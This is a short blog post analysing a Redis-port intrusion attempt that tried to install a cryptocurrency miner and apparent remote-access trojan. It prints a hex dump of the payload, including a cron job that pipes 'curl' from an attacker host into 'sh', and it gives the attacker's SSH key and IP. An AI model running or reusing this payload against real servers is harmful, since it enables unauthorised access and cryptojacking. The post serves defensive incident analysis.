---
title: "Attacks Spreading Cryptocoin Miners"
#author: "Author Name"
description: "Description of an attack against the Redis port attempting to infect a target with a cryptocoin miner"
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-06-12T00:00:00-00:00
draft: false
---
This morning on TCP 6379 I received an offer my computer, fortunately, refused.

```hex
2a310d0a24370d0a434f4d4d414e440d *1..$7..COMMAND.
0a2a340d0a24360d0a636f6e6669670d .*4..$6..config.
0a24330d0a7365740d0a2431300d0a64 .$3..set..$10..d
6266696c656e616d650d0a24390d0a62 bfilename..$9..b
61636b75702e64620d0a2a310d0a2434 ackup.db..*1..$4
0d0a736176650d0a2a310d0a24380d0a ..save..*1..$8..
666c757368616c6c0d0a2a330d0a2433 flushall..*3..$3
0d0a7365740d0a24370d0a74726f6a61 ..set..$7..troja
6e310d0a2436340d0a0a2a2f31202a20 n1..$64...*/1 * 
2a202a202a206375726c202d6673534c * * * curl -fsSL
20687474703a2f2f6368726f6d652e7a  http://chrome.z
6572306461792e72753a353035302f6d er0day.ru:5050/m
727831207c2073680a0d0a           rx1 | sh...
```

Forget everything you know!  Trojan time.

The download link provided a shell script, which used both yum and apt-get to install a variety of dependencies, add an authorized ssh key to root, drop external connections to port 6379 via iptables (Bold move!  Considering that's how this sucker entered...), download what is likely a Rat, and a miner, execute the rat and the miner (outputting to pool.zer0day.ru:8080), download what claims to be glibc-2.14 and try the miner again with that version of glibc, then try again to drop external connections to 6379 via iptables.

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV1VxPVZFUOOWZwMFVBwP/904lhAZNj2U5DPsZyIWw33jHeFRElM++XnUYmkMDiu8KuJXnFDJMkyXxsq77fOpDhVGOoexll3+P6SmZWViWwnhOgvxhccgT72J+LPZEIwPqPZQVHR4ksdVSnMVreyZs+rQ7O+L2xychpqzeIrk4Q/08f5XreOnq4Rgxp9oKwSlf7vKmQ7tUWUxfMHHL1wQYZPmdKpgSi/JmokLpp5cKAT7r0gGOj1jV8ZAJc+z45Ts2JBH9JYscHBssh7MBWWymcjXANd9a6XaQnbnl6nOFFNyYm8dBuLkGpEUNCdMq/jc5YLfnAnbGVbBMhuWzaWUp root@host-10-10-10-26
```

"root@host-10-10-10-26" - cute

It looks like they backed up the Redis database before erasing it though...  This nice request came from 110.249.214.178.
